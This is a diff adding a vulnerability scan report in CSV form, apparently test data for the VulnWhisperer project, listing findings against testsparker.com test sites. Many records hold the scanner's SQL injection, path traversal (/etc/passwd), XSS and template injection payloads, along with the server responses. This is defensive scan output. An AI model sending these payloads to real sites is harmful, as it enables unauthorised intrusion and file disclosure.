@@ -1,0 +1,2007 @@
+"Scan Report","25 Apr 2019 10:42AM GMT"
+"VulnWhisperer project","Barcelona",,,"08001","Spain"
+"pemontto","pemontto",""
+"DESCRIPTION"
+"Vulnerabilities of all selected scans are consolidated into one report so that you can view their evolution."
+"TARGET"
+"Scans","VulnWhisperer TestSparker & subdomains"
+"FILTERS"
+"Remediation","Include patched findings"
+"Remediation","Show ignored findings "
+"SUMMARY"
+"Security Risk","Vulnerabilities","Sensitive Contents","Information Gathered"
+"High","68","0","24"
+"Scan","Date","Level 5","Level 4","Level 3","Level 2","Level 1","Sensitive Contents","Information Gathered"
+"VulnWhisperer TestSparker & subdomains","24 Apr 2019","11","3","20","14","20","0","24"
+"RESULTS"
+"VULNERABILITY","ID","Detection ID","QID","Url","Param","Function","Form Entry Point","Access Path","Authentication","Ajax Request","Ajax Request ID","Ignored","Ignore Reason","Ignore Date","Ignore User","Ignore Comments","Detection Date","Payload #1","Request Method #1","Request URL #1","Request Headers #1","Response #1","Evidence #1"
+"VULNERABILITY","78419248","2111160","150085","http://aspnet.testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","POST","http://aspnet.testsparker.com/","","Vulnerable to slow HTTP POST attack
+	Connection with partial POST body remained open for: 130475 milliseconds
+	Server resets timeout after accepting request data from peer.",""
+"VULNERABILITY","78419250","2111164","150159","http://aspnet.testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/","","ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj; path=/; domain=aspnet.testsparker.com; httponly",""
+"VULNERABILITY","78419269","2111202","150053","http://angular.testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://angular.testsparker.com/","","comment: Parent URL of Login Form is : http://angular.testsparker.com/results
+Login Form Is Not Submitted Via HTTPS
+",""
+"VULNERABILITY","78419241","2111146","150004","http://php.testsparker.com/auth/images/.","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://php.testsparker.com/auth/images/.","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: This directory was discovered during the crawl phase.
+
+<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2 Final//EN"">
+<html>
+ <head>
+  <title>Index of /auth/images</title>
+ </head>
+ <body>
+<h1>Index of /auth/images</h1>
+<table><tr><th><img src=""/icons/blank.gif"" alt=""[ICO]""></th><th><a href=""?C=N;O=D"">Name</a></th><th><a href=""?C=M;O=A"">Last modified</a></th><th><a href=""?C=S;O=A"">Size</a></th><th><a href=""?C=D;O=A"">Description</a></th></tr><tr><th colspan=""5""><hr></th></tr>
+<tr><td valign=""top""><img src=""/icons/back.gif"" alt=""[DIR]""></td><td><a href=""/aut",""
+"VULNERABILITY","78419247","2111158","150022","http://aspnet.testsparker.com/WS_search.asmx/%22%20qss%3D%22QssAttrValue","","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/About.aspx?hello=visitor","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://aspnet.testsparker.com/WS_search.asmx/%22%20qss%3D%22QssAttrValue","GET","http://aspnet.testsparker.com/WS_search.asmx/%22%20qss%3D%22QssAttrValue","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: Response status: 500
+Original URL is: http://aspnet.testsparker.com/WS_search.asmx
+
+hite-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor=""white"">
+
+            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>Request format is unrecognized for URL unexpectedly ending in '/"" qss=""QssAttrValue'.</i> </h2></span>
+
+            <font face=""Arial, Helvetica, Geneva,","<span><H1>Server Error in '/' Application."
+"VULNERABILITY","78419249","2111162","150162","http://aspnet.testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://aspnet.testsparker.com/","","Vulnerable javascript library: jQuery
+version: 2.0.2
+script uri: http://ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js
+
+Details:
+CVE-2015-9251: jQuery versions on or above 1.4.0 and below 1.12.0 (version 1.12.3 and above but below 3.0.0-beta1 as well) are vulnerable to XSS via 3rd party text/javascript responses(3rd party CORS request may execute). (https://github.com/jquery/jquery/issues/2432).
+Solution: jQuery version 3.0.0 has been released to address the issue (http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/). Please refer to vendor documentation (https://blog.jquery.com/) for the latest security updates.
+
+----------------------------------------------
+
+In jQuery versions on or above 1.12.2 and below 2.2.0 $.parseHTML has (lots of) XSS. In these versions parseHTML() executes scripts in event handlers. Please refer following resource for more details: https://bugs.jquery.com/ticket/11974, http://research.insecurelabs.org/jquery/test/
+
+Found on the following pages (only first 10 pages are reported):
+http://aspnet.testsparker.com/
+http://aspnet.testsparker.com/Default.aspx
+http://aspnet.testsparker.com/Blogs.aspx
+http://aspnet.testsparker.com/Shop.aspx
+http://aspnet.testsparker.com/Converter.aspx
+http://aspnet.testsparker.com/ConverterResponse.aspx
+http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F
+http://aspnet.testsparker.com/Help.aspx
+http://aspnet.testsparker.com/Contact.aspx
+http://aspnet.testsparker.com/Guestbook.aspx",""
+"VULNERABILITY","78419228","2111120","150012","http://angular.testsparker.com/api/getUser.php?username=ava%27%20%2B%20(SELECT%200%20FROM%20(SELECT%20SLEEP(29))qsqli_2222)%20%2B%20%27","username","","","http://testsparker.com/,http://angular.testsparker.com/,http://angular.testsparker.com/activity,http://angular.testsparker.com/user/ava","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","%27%20%2B%20(SELECT%200%20FROM%20(SELECT%20SLEEP(29))qsqli_2222)%20%2B%20%27","GET","http://angular.testsparker.com/api/getUser.php?username=charlotte%27%20%2B%20(SELECT%200%20FROM%20(SELECT%20SLEEP(29))qsqli_2222)%20%2B%20%27","Referer: http://testsparker.com/
+","comment: (Times are expressed in milliseconds.)
+Expected response delay: 28000
+Observed response delay: 29010
+Mean response time: 16
+Standard deviation: 100
+Number of stddev from mean: 287.308958
+
+This vulnerability was identified using time-based inference that compared the average response time of a page to its response time with an injected payload. This vulnerability is confirmed based on timing rather than the content of the response.
+",""
+"VULNERABILITY","78419220","2111104","150191","http://php.testsparker.com/hello.php?name=%3Becho%2023.0231*213.759%3B%2f%2f%7B%40math%20key%3D4335.158242899999%20method%3D%22add%22%20operand%3D586.23659%2F%7D%0A%2F*%20%0A%0A%23set(%24value%3D23.0231*213.759)%0A%24value%0A%20*%2F","name","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","name=%3Becho%2023.0231*213.759%3B%2f%2f%7B%40math%20key%3D4335.158242899999%20method%3D%22add%22%20operand%3D586.23659%2F%7D%0A%2F*%20%0A%0A%23set(%24value%3D23.0231*213.759)%0A%24value%0A%20*%2F","GET","http://php.testsparker.com/hello.php?name=%3Becho%2023.0231*213.759%3B%2f%2f%7B%40math%20key%3D4335.158242899999%20method%3D%22add%22%20operand%3D586.23659%2F%7D%0A%2F*%20%0A%0A%23set(%24value%3D23.0231*213.759)%0A%24value%0A%20*%2F","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","div>
+	<!-- end #header -->	<div id=""page"">
+	<div id=""page-bgtop"">
+	<div id=""page-bgbtm"">
+		<div id=""content"">
+			<div class=""post"">
+								<h1 class=""title""><a href=""#"">Hello Service </a></h1>
+					<p>
+                    Hello Visitor4921.394832920$str = 20 ;echo 23.0231*213.759;//{@math key=4335.158242899999 method=""add"" operand=586.23659/}
+/* 
+
+#set($value=23.0231*213.759)
+$value
+ */;20                    </p>
+
+				<div style=""clear: both;"">&nbsp;</div>
+				<div class=""entry"">
+
+","4921.394832"
+"VULNERABILITY","78419262","2111188","150081","http://aspnet.testsparker.com/Contact.aspx","","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","POST","http://aspnet.testsparker.com/Contact.aspx","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419261","2111186","150124","http://aspnet.testsparker.com/Contact.aspx","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Contact.aspx","","The URI was framed.
+",""
+"VULNERABILITY","78419224","2111112","150023","http://aspnet.testsparker.com/statics/download/../","","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/statics/style.css","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://aspnet.testsparker.com/statics/download/../","GET","http://aspnet.testsparker.com/statics/download/../","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: 
+Original URL is: http://aspnet.testsparker.com/statics/download/
+
+<html><head><title>aspnet.testsparker.com - /statics/</title></head><body><H1>aspnet.testsparker.com - /statics/</H1><hr>
+
+<pre><A HREF=""/"">[To Parent Directory]</A><br><br> 4/11/2019  2:09 PM         1625 <A HREF=""/statics/btnBuyNowPricing.gif"">btnBuyNowPricing.gif</A><br> 4/11/2019  2:09 PM         1464 <A HREF=""/statics/btnBuyNowPricingBlue.gif"">btnBuyNowPricingBlue.gif</A><br> 4/11/2019  2:09 PM          176 <A HREF=""/statics/data.mdb"">data.mdb</A><br> 4/12/2019  9:51 AM        <dir>","To Parent Directory"
+"VULNERABILITY","78419217","2111098","150112","http://php.testsparker.com/auth/control.php","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","POST","http://php.testsparker.com/auth/control.php","","The following password field(s) in the form do not set autocomplete=""off"":
+(Field name: password, Field id: )
+Parent URL of form is: http://php.testsparker.com/auth/login.php
+",""
+"VULNERABILITY","78419234","2111132","150191","http://php.testsparker.com/artist.php?id=%0A%7Caaaa%0A%3D(23.0231*213.759)%0A%7C%24%7B23.0231*213.759%7D%7B23.0231*213.759%7D%7B%7B23.0231*213.759%7D%7D(23.0231*213.7591)%3D(23.0231*213.759)%23%7B23.0231*213.759%7D%3C%25%3D%2023.0231*213.759%20%25%3E","id","","http://php.testsparker.com/","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","id=%0A%7Caaaa%0A%3D(23.0231*213.759)%0A%7C%24%7B23.0231*213.759%7D%7B23.0231*213.759%7D%7B%7B23.0231*213.759%7D%7D(23.0231*213.7591)%3D(23.0231*213.759)%23%7B23.0231*213.759%7D%3C%25%3D%2023.0231*213.759%20%25%3E","GET","http://php.testsparker.com/artist.php?id=%0A%7Caaaa%0A%3D(23.0231*213.759)%0A%7C%24%7B23.0231*213.759%7D%7B23.0231*213.759%7D%7B%7B23.0231*213.759%7D%7D(23.0231*213.7591)%3D(23.0231*213.759)%23%7B23.0231*213.759%7D%3C%25%3D%2023.0231*213.759%20%25%3E","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","	<h2 class=""title""><a href=""artist.php#"">Artist Service</a></h2>
+
+				<div style=""clear: both;"">&nbsp;</div>
+				<div class=""entry"">
+					<p>
+                    
+<h3>Results: 
+|aaaa
+=(23.0231*213.759)
+|${23.0231*213.759}{23.0231*213.759}4921.3948329(23.0231*213.7591)=(23.0231*213.759)#{23.0231*213.759}<%= 23.0231*213.759 %></h3></br>
+
+no rows returned 
+                    </p>
+
+				</div>
+			</div>
+		<div style=""clear: both;"">&nbsp;</div>
+		</div>
+		<!-- end #content -->
+	       ","4921.394832"
+"VULNERABILITY","78419231","2111126","150022","http://aspnet.testsparker.com/WS_search.asmx/%22%3e%3cimg%20src%3dq%20onerror%3dalert(9)%3e","","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/About.aspx?hello=visitor","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://aspnet.testsparker.com/WS_search.asmx/%22%3e%3cimg%20src%3dq%20onerror%3dalert(9)%3e","GET","http://aspnet.testsparker.com/WS_search.asmx/%22%3e%3cimg%20src%3dq%20onerror%3dalert(9)%3e","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: Response status: 500
+Original URL is: http://aspnet.testsparker.com/WS_search.asmx
+
+hite-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor=""white"">
+
+            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>Request format is unrecognized for URL unexpectedly ending in '/""><img src=q onerror=alert(9)>'.</i> </h2></span>
+
+            <font face=""Arial, Hel","<span><H1>Server Error in '/' Application."
+"VULNERABILITY","78419268","2111200","150001","http://php.testsparker.com/products.php?pro=%22%20onEvent%3DX157322828Y1Z%20","pro","","","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","pro=%22%20onEvent%3DX157322828Y1Z%20","GET","http://php.testsparker.com/products.php?pro=%22%20onEvent%3DX157322828Y1Z%20","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: 
+Response content-type: text/html
+
+"" content="""" />
+<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />
+<title>Netsparker Test Web Site -  PHP</title>
+<link href=""style.css"" rel=""stylesheet"" type=""text/css"" media=""screen"" />
+</head><script type=text/javascript src = """" onEvent=X157322828Y1Z "" ></script>
+<body>
+<div id=""wrapper"">
+
+	<div id=""menu"">
+		<ul>
+			<li><a href=""process.php?file=Generics/index.nsp"">Home</a></li>
+			<li><a href=""hello.php?name=Visitor"">Hello</a></li>
+			<li><a href=""products.php","<script type=text/javascript src = """" onEvent=X157322828Y1Z "" >"
+"VULNERABILITY","78419280","2111224","150081","http://aspnet.testsparker.com/Shop.aspx","","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Shop.aspx","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419281","2111226","150004","http://php.testsparker.com/process.bak","","","","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://php.testsparker.com/process.bak","GET","http://php.testsparker.com/process.bak","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: 
+Original URL is: http://php.testsparker.com/process.php?file=Generics/index.nsp
+
+HTTP/1.1 200 OK",""
+"VULNERABILITY","78419263","2111190","150059","http://aspnet.testsparker.com/Generics/FormString.asp","","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://aspnet.testsparker.com/Generics/FormString.asp","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","C:\Websites\aspnet.testsparker\Generics\FormString.asp",""
+"VULNERABILITY","78419274","2111212","150001","http://aspnet.testsparker.com/About.aspx?hello=%22'%3E%3Cqss%20a%3DX157323056Y1Z%3E","hello","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","hello=%22'%3E%3Cqss%20a%3DX157323056Y1Z%3E","GET","http://aspnet.testsparker.com/About.aspx?hello=%22'%3E%3Cqss%20a%3DX157323056Y1Z%3E","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: 
+Response content-type: text/html
+
+tentCenterMenu -->
+                
+    
+
+<style>
+    span#myspan4{
+        background-color: wheat;
+    }
+
+</style>
+<h1>About</h1>
+<p>
+    Hello
+    <span id=""contentCenterMenu_aboutReflectedCrossSiteScripting_lblVisitor"">""'><qss a=X157323056Y1Z></span>
+</p>
+<p>
+    Bitcoin is controlled by all Bitcoin users around the world. Developers are improving the software but they can't force a change in the rules of the Bitcoin protocol because all users are free to choose what software","<qss a=X157323056Y1Z>"
+"VULNERABILITY","78419236","2111136","150084","http://php.testsparker.com/artist.php?id=%3C%0a%0dscript%20a%3D4%3Eqss%3D7%3C%0a%0d%2Fscript%3E","id","","http://php.testsparker.com/","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","id=%3C%0a%0dscript%20a%3D4%3Eqss%3D7%3C%0a%0d%2Fscript%3E","GET","http://php.testsparker.com/artist.php?id=%3C%0a%0dscript%20a%3D4%3Eqss%3D7%3C%0a%0d%2Fscript%3E","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: A significant portion of the XSS test payload appeared in the web page, but the page's DOM was not modified as expected for a successful exploit. This result should be manually verified to determine its accuracy.
+
+Response content-type: text/html
+
+m"">
+		<div id=""content"">
+			<div class=""post"">
+				<h2 class=""title""><a href=""artist.php#"">Artist Service</a></h2>
+
+				<div style=""clear: both;"">&nbsp;</div>
+				<div class=""entry"">
+					<p>
+                    
+<h3>Results: <
+
+script a=4>qss=7<
+
+/script></h3></br>
+
+no rows returned 
+                    </p>
+
+				</div>
+			</div>
+		<div style=""clear: both;"">&nbsp;</div>
+		</div>
+		<!-- end #content -->
+	        
+	<div id=""sidebar"">
+			<ul>
+				<li>
+					<div id=""search"" >
+","<
+
+script a=4>qss=7<
+
+/script>"
+"VULNERABILITY","78419258","2111180","150004","http://php.testsparker.com/.svn/entries","","","","http://testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://php.testsparker.com/.svn/entries","GET","http://php.testsparker.com/.svn/entries","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: 
+Original URL is: http://php.testsparker.com/
+
+HTTP/1.1 200 OK",""
+"VULNERABILITY","78419252","2111168","150124","http://aspnet.testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/","","The URI was framed.
+",""
+"VULNERABILITY","78419218","2111100","150011","http://angular.testsparker.com/api/getAvatar.php?file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","file","","","http://testsparker.com/,http://angular.testsparker.com/,http://angular.testsparker.com/activity,http://angular.testsparker.com/user/ava","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","GET","http://angular.testsparker.com/api/getAvatar.php?file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","Referer: http://testsparker.com/
+","root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin","root:x:0:0:"
+"VULNERABILITY","78419277","2111218","150022","http://aspnet.testsparker.com/Help.aspx?item=(23.0231*213.759)","item","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/Help.aspx","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","""'><qss>","GET","http://aspnet.testsparker.com/Help.aspx?item=help-konu1.html%22'%3E%3Cqss%3E","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: Response status: 500
+hite-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor=""white"">
+
+            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>Illegal characters in path.</i> </h2></span>
+
+            <font face=""Arial, Helvetica, Geneva, SunSans-Regular, sans-serif "">
+
+            <b> Description: </b>","<span><H1>Server Error in '/' Application."
+"VULNERABILITY","78419256","2111176","150004","http://php.testsparker.com/test/","","","","http://testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://php.testsparker.com/test/","GET","http://php.testsparker.com/test/","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: 
+Original URL is: http://php.testsparker.com/
+
+HTTP/1.1 200 OK",""
+"VULNERABILITY","78419273","2111210","150084","http://aspnet.testsparker.com/About.aspx?hello=%3C%0a%0dscript%20a%3D4%3Eqss%3D7%3C%0a%0d%2Fscript%3E","hello","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","hello=%00%3Cscript%3E_q%3Drandom(X157323056Y1Z)%3C%2Fscript%3E","GET","http://aspnet.testsparker.com/About.aspx?hello=%00%3Cscript%3E_q%3Drandom(X157323056Y1Z)%3C%2Fscript%3E","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: A significant portion of the XSS test payload appeared in the web page, but the page's DOM was not modified as expected for a successful exploit. This result should be manually verified to determine its accuracy.
+
+Response content-type: text/html
+
+erMenu -->
+                
+    
+
+<style>
+    span#myspan4{
+        background-color: wheat;
+    }
+
+</style>
+<h1>About</h1>
+<p>
+    Hello
+    <span id=""contentCenterMenu_aboutReflectedCrossSiteScripting_lblVisitor"">",""
+"VULNERABILITY","78419233","2111130","150012","http://php.testsparker.com/artist.php?id=1%20%2B%20(SELECT%200%20FROM%20(SELECT%20SLEEP(29))qsqli_1111)%20","id","","http://php.testsparker.com/","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","id=11%20or%2011%3D11","GET","http://php.testsparker.com/artist.php?id=11%20or%2011%3D11&id=11%20or%2011%3D11&id=11%20or%2011%3D11","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","This vulnerability was identified using the difference in responses for TRUE and FALSE payloads. This vulnerability is confirmed based on the difference in the response content (detected using fuzzy match).
+
+Content of all TRUE responses differ from FALSE responses (detected using fuzzy match).
+
+True condition:
+
+http://php.testsparker.com/artist.php?id=11%20or%2011%3D11&id=11%20or%2011%3D11&id=11%20or%2011%3D11
+
+BODY
+id=11%20or%2011%3D11
+
+False condition:
+
+http://php.testsparker.com/artist.php?id=11%20or%2011%3D12&id=11%20or%2011%3D12&id=11%20or%2011%3D12
+
+BODY
+id=11%20or%2011%3D12",""
+"VULNERABILITY","78419226","2111116","150124","http://aspnet.testsparker.com/Default.aspx","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Default.aspx","","The URI was framed.
+",""
+"VULNERABILITY","78419244","2111152","150059","http://aspnet.testsparker.com/statics/Web.config","","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/statics/style.css","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://aspnet.testsparker.com/statics/Web.config","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","C:\Websites\aspnet.testsparker\statics\Web.config",""
+"VULNERABILITY","78419246","2111156","150081","http://testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://testsparker.com/","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419279","2111222","150124","http://aspnet.testsparker.com/Shop.aspx","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Shop.aspx","","The URI was framed.
+",""
+"VULNERABILITY","78419278","2111220","150011","http://aspnet.testsparker.com/Help.aspx?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts","item","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/Help.aspx","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","item=..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts","GET","http://aspnet.testsparker.com/Help.aspx?item=..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","alFileInclusion_HyperLink1"" href=""/Help.aspx?item=help-konu1.html"">Q:What is Bitcoin?</a></li>
+</ul>
+<div id=""contentCenterMenu_helpLocalFileInclusion_divFileContent""># Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+","This is a sample HOSTS file used by Microsoft TCP/IP for Windows."
+"VULNERABILITY","78419237","2111138","150001","http://php.testsparker.com/artist.php?id=%22'%3E%3Cqss%20a%3DX157322980Y1Z%3E","id","","http://php.testsparker.com/","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","id=%22'%3E%3Cqss%20%60%3b!--%3D%26%7b()%7d%3E","GET","http://php.testsparker.com/artist.php?id=%22'%3E%3Cqss%20%60%3b!--%3D%26%7b()%7d%3E","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: 
+Response content-type: text/html
+
+gbtm"">
+		<div id=""content"">
+			<div class=""post"">
+				<h2 class=""title""><a href=""artist.php#"">Artist Service</a></h2>
+
+				<div style=""clear: both;"">&nbsp;</div>
+				<div class=""entry"">
+					<p>
+                    
+<h3>Results: ""'><qss `;!--=&{()}></h3></br>
+
+no rows returned 
+                    </p>
+
+				</div>
+			</div>
+		<div style=""clear: both;"">&nbsp;</div>
+		</div>
+		<!-- end #content -->
+	        
+	<div id=""sidebar"">
+			<ul>
+				<li>
+					<div id=""search"" >
+						","<qss `;!--=&{()}>"
+"VULNERABILITY","78419282","2111228","150059","http://php.testsparker.com/process.php?file=Generics/about.nsp","","","","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://php.testsparker.com/process.php?file=Generics/about.nsp","Referer: http://testsparker.com/
+","C:\AppServ\www\Generics\about.nsp",""
+"VULNERABILITY","78419265","2111194","150123","http://php.testsparker.com/auth/login.php","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://php.testsparker.com/auth/login.php","","PHPSESSID=375a1719e219e711f342095cfe2a9d4f; path=/; domain=php.testsparker.com",""
+"VULNERABILITY","78419221","2111106","150084","http://php.testsparker.com/hello.php?name=%3C%0a%0dscript%20a%3D4%3Eqss%3D7%3C%0a%0d%2Fscript%3E","name","","","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","name=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E","GET","http://php.testsparker.com/hello.php?name=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: A significant portion of the XSS test payload appeared in the web page, but the page's DOM was not modified as expected for a successful exploit. This result should be manually verified to determine its accuracy.
+
+Response content-type: text/html
+
+le""><a href=""#"">Hello Service </a></h1>
+					<p>
+                    Hello Visitor<br />
+<b>Parse error</b>:  syntax error, unexpected '""' in <b>C:\AppServ\www\hello.php(24) : eval()'d code</b> on line <b>1</b><br />
+20$str = 20 ""'><<SCRIPT a=2>qss=7;//<</SCRIPT>;20                    </p>
+
+				<div style=""clear: both;"">&nbsp;</div>
+				<div class=""entry"">
+
+
+				</div>
+			</div>
+		<div style=""clear: both;"">&nbsp;</div>
+		</div>
+		<!-- end #content -->
+	        
+	<div id=""sidebar"">
+","<<SCRIPT a=2>qss=7;//<</SCRIPT>"
+"VULNERABILITY","78419216","2111096","150053","http://php.testsparker.com/auth/control.php","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","POST","http://php.testsparker.com/auth/control.php","","comment: Parent URL of Login Form is : http://php.testsparker.com/auth/login.php
